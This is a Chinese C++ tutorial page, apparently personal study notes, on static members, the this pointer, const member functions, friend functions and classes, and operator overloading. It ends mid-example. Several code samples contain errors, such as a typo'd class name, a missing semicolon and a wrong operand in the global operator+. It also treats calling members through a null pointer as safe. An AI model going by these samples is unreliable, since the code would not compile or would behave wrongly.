title="静态成员"></a>静态成员</h3><p>在成员变量和成员函数前加static，称为静态成员</p><p>静态成员分为</p><h4 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h4><ul><li>所有对象共用一份数据</li><li>编译阶段分配内存</li><li>类内声明，类外初始化</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;<br>&#125;;<br><span class="hljs-type">int</span> person::a=<span class="hljs-number">100</span>;<span class="hljs-comment">//类外初始化</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>     person p1;<br>     p<span class="hljs-number">1.</span>a=<span class="hljs-number">200</span>;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">//100</span><br><span class="hljs-comment">//200</span><br></code></pre></td></tr></table></figure><p>静态成员变量不属于某个对象上，所有对象共享同一份数据</p><p>因此有两种访问方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br><span class="hljs-comment">//通过对象访问</span><br>cout&lt;&lt;p.a&lt;&lt;endl;<br><span class="hljs-comment">//通过类名访问</span><br>cout&lt;&lt;person::a&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态成员变量同样存在访问权限</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-type">int</span> person::a=<span class="hljs-number">100</span>;<span class="hljs-comment">//类外初始化</span><br><span class="hljs-type">int</span> person::b=<span class="hljs-number">101</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>     person p1;<br>     p<span class="hljs-number">1.</span>a=<span class="hljs-number">200</span>;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">//100</span><br><span class="hljs-comment">//200</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;person::b&lt;&lt;endl;<span class="hljs-comment">//会报错，由于private权限，类外不可访问</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h4><ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量（因为无法区分这个变量是谁的）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;静态成员函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问方式：</p><ul><li>通过对象访问</li><li>通过类名访问</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br><span class="hljs-comment">//通过对象访问</span><br>p.<span class="hljs-built_in">func</span>();<br><span class="hljs-comment">//通过类名访问</span><br>person::<span class="hljs-built_in">func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="c-对象模型和this指针"><a href="#c-对象模型和this指针" class="headerlink" title="c++对象模型和this指针"></a>c++对象模型和this指针</h2><h3 id="成员变量和成员函数分开存储"><a href="#成员变量和成员函数分开存储" class="headerlink" title="成员变量和成员函数分开存储"></a>成员变量和成员函数分开存储</h3><p>C++中，类内的成员变量和成员函数分开存储</p><p>只有<strong>非静态成员变量</strong>才属于类的对象上。静态成员变量、非静态成员函数、静态成员函数都不属于类的对象上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person1</span><br>&#123;<br>     <span class="hljs-type">int</span> a;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person2</span><br>&#123;<br>     <span class="hljs-type">int</span> a;<br>     <span class="hljs-type">static</span> <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-type">int</span> person2::b=<span class="hljs-number">100</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//输出结果是1，所以空对象占用内存是1</span><br>     <span class="hljs-comment">//c++会给每个空对象也分配一个字节，为了区别空对象占内存的位置，空对象也有独一无二的内存地址</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person1 p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//结果是4</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test03</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person2 p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//结果是还是4，它没有存储在类中</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h3><p>C++通过提供特殊的对象指针，this指针，来区分是哪个对象调用的。<strong>this指针指向被调用的成员函数所属的对象</strong></p><ul><li>this指针隐含在每一个非静态成员函数内的一种指针</li><li>this指针不需要定义，可以直接使用</li></ul><p>用途</p><ul><li>当形参和成员函数重名时，用this指针来区分</li><li>在非静态成员函数中返回对象本身，可以使用<code>return *this</code></li></ul><p>实例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> age)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;age=age;<br><span class="hljs-comment">//不能直接age=age，会报错</span><br>&#125;<br>     <span class="hljs-function">person&amp; <span class="hljs-title">addage</span><span class="hljs-params">(person&amp; p)</span><span class="hljs-comment">//要是引用，如果是person，返回的话就是浅拷贝创建了一个新对象，不再是原本的那个</span></span><br><span class="hljs-function">     </span>&#123;<br>          <span class="hljs-keyword">this</span>-&gt;age+=p.age;<br>          <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//这样就可以重复调用</span><br>     &#125;<br><span class="hljs-type">int</span> age;<br>&#125;<br><span class="hljs-comment">//解决名称冲突</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;p1年龄：&quot;</span>&lt;&lt;endl;<span class="hljs-comment">//此时this指向p1;</span><br>&#125;<br><span class="hljs-comment">//返回对象本身用*this</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>     p<span class="hljs-number">2.</span><span class="hljs-built_in">addage</span>(p1).<span class="hljs-built_in">addage</span>(p1),<span class="hljs-built_in">addage</span>(p1);<span class="hljs-comment">//如果没有return *this就会报错</span><br>     <span class="hljs-comment">//链式编程思想</span><br>     cout&lt;&lt;<span class="hljs-string">&quot;p2年龄为：&quot;</span>&lt;&lt;p<span class="hljs-number">2.</span>age&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="空指针访问成员函数"><a href="#空指针访问成员函数" class="headerlink" title="空指针访问成员函数"></a>空指针访问成员函数</h3><p>C++中空指针也可以调用成员函数的，但要注意有没有用到this指针</p><p>如果遇到this指针要加以判断保证代码健壮性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showtype</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;This is person class&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>==<span class="hljs-literal">NULL</span>)<br>               <span class="hljs-keyword">return</span>;<span class="hljs-comment">//检查保证程序不会崩溃</span><br>cout&lt;&lt;age&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> age;<br>&#125;；<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>preson *p=<span class="hljs-literal">NULL</span>;<br>p-&gt;<span class="hljs-built_in">showtype</span>();<span class="hljs-comment">//这句不会</span><br>p-&gt;<span class="hljs-built_in">showage</span>();<span class="hljs-comment">//这句会出错，报错原因在于传入指针为空，age相当于this-&gt;age，而this指针是空</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="const修饰成员函数"><a href="#const修饰成员函数" class="headerlink" title="const修饰成员函数"></a>const修饰成员函数</h3><ul><li>常函数<ul><li>加const后称为常函数</li><li>常函数内不可修改成员属性</li><li><strong>成员属性后加mutable后，在常函数内可以修改</strong></li></ul></li><li>常对象<ul><li>声明对象前加const后称为常函数</li><li>常对象只能调用常函数</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showperson</span> <span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>a = <span class="hljs-number">100</span>;<span class="hljs-comment">//会报错，因为这个const将this指针变成const person * const this这样左值就不可修改了</span><br>          <span class="hljs-comment">//在成员函数后加const，修饰的是this指针，让指针指向的值也不可被修改</span><br>&#125;<br>     <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function">     </span>&#123;<br>          <br>     &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br>p.<span class="hljs-built_in">showperson</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">const</span> person p;<br>     p.a=<span class="hljs-number">100</span>;<span class="hljs-comment">//报错，也不可修改属性，但加mutable就可以修改了</span><br>     p.<span class="hljs-built_in">showperson</span>();<br>     p.<span class="hljs-built_in">show</span>();<span class="hljs-comment">//会报错，不可调用普通成员函数，因为普通成员函数可以修改属性，与常对象矛盾</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="调用规则"><a href="#调用规则" class="headerlink" title="调用规则"></a>调用规则</h4><ul><li><strong><code>const</code> 成员函数</strong> 可以被 <code>const</code> 对象调用，也可以被非 <code>const</code> 对象调用（但优先调用非 <code>const</code> 版本）。<br>  <strong>非</strong></li><li>** <code>const</code> 成员函数** 只能被非 <code>const</code> 对象调用。</li><li><strong><code>const</code> 可以用来区分重载函数</strong>，只要它们的参数列表相同，但 <code>const</code> 属性不同。</li></ul><h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>在程序里，有些私有属性，也想让类外的一些特殊的函数或类进行访问，需要用到友元</p><p>关键字：<strong>friend</strong></p><ul><li>三种实现<ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul></li></ul><h3 id="全局函数做友元"><a href="#全局函数做友元" class="headerlink" title="全局函数做友元"></a>全局函数做友元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">gfriend</span><span class="hljs-params">(room* r)</span></span>;<span class="hljs-comment">//实现友元，这样公有和私有都可以访问了</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">room</span>()<br>&#123;<br>sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">public</span>:<br>string sroom;<br><span class="hljs-keyword">private</span>:<br>string bedroom;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gfriend</span><span class="hljs-params">(room* r)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局函数访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局函数访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>room rr;<br><span class="hljs-built_in">gfriend</span>(&amp;rr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类做友元"><a href="#类做友元" class="headerlink" title="类做友元"></a>类做友元</h3><p>让一个类可以访问另一个类的私有成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span><br>&#123;<br><span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span>;<span class="hljs-comment">//实现类做友元</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">room</span>();<br><span class="hljs-keyword">public</span>:<br>string sroom;<br><span class="hljs-keyword">private</span>:<br>string bedroom;<br>&#125;;<br>room::<span class="hljs-built_in">room</span>()<span class="hljs-comment">//类外实现构造函数</span><br>&#123;<br>sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>room* r;<br><span class="hljs-built_in">gfriend</span>()<br>&#123;<br>r = <span class="hljs-keyword">new</span> room;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>gfriend gg;<br>gg.<span class="hljs-built_in">visit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="成员函数做友元"><a href="#成员函数做友元" class="headerlink" title="成员函数做友元"></a>成员函数做友元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span>; <span class="hljs-comment">// 前向声明</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br>    room* r;<br>    <span class="hljs-built_in">gfriend</span>();<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 先声明成员函数</span><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span> <br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">gfriend::visit</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 此时 gfriend 类已定义，实现友元</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">room</span>();<br>    string sroom;<br><span class="hljs-keyword">private</span>:<br>    string bedroom;<br>&#125;;<br><br><span class="hljs-comment">// 类成员函数的实现</span><br>room::<span class="hljs-built_in">room</span>() <br>&#123;<br>    sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>    bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><br>gfriend::<span class="hljs-built_in">gfriend</span>() <br>&#123;<br>    r = <span class="hljs-keyword">new</span> room;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gfriend::visit</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl; <span class="hljs-comment">// 现在可以访问私有成员</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    gfriend gg;<br>    gg.<span class="hljs-built_in">visit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p>对运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p><h3 id="加号运算符重载"><a href="#加号运算符重载" class="headerlink" title="加号运算符重载"></a>加号运算符重载</h3><p>作用：实现自定义数据类型的运算</p><h4 id="成员函数重载加号"><a href="#成员函数重载加号" class="headerlink" title="成员函数重载加号"></a>成员函数重载加号</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p)<br>&#123;<br>person temp;<br>temp.a = a + p.a;<br>temp.b = b + p.b;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br>     <span class="hljs-comment">//本质p3=p1.operator+(p2);简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="全局函数重载加号"><a href="#全局函数重载加号" class="headerlink" title="全局函数重载加号"></a>全局函数重载加号</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>&#125;;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, person&amp; p2)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + p<span class="hljs-number">2.</span>a;<br>temp.b = p<span class="hljs-number">2.</span>b + p<span class="hljs-number">2.</span>b;<br><span class="hljs-keyword">return</span> 